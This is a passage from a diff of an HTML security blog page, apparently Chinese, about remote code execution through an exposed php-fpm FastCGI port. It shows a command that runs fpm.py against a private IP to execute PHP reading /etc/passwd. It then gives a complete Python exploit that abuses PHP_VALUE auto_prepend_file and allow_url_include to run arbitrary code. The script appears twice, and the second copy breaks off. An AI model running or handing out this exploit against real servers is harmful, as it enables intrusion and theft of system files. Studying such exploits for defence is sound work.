+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS python3 .\fpm.py 192.168.110.140 /usr/<span class="built_in">local</span>/lib/php/PEAR.php -c <span class="string">&#x27;&lt;?php echo `cat /etc/passwd`;exit;?&gt;&#x27;</span></span><br><span class="line">X-Powered-By: PHP/7.3.9</span><br><span class="line">Content-type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>
+
 
 <p>附上exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">'connect failure! please check your fasctcgi-server !!'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">'response'</span>] = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    print(force_text(response))</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: 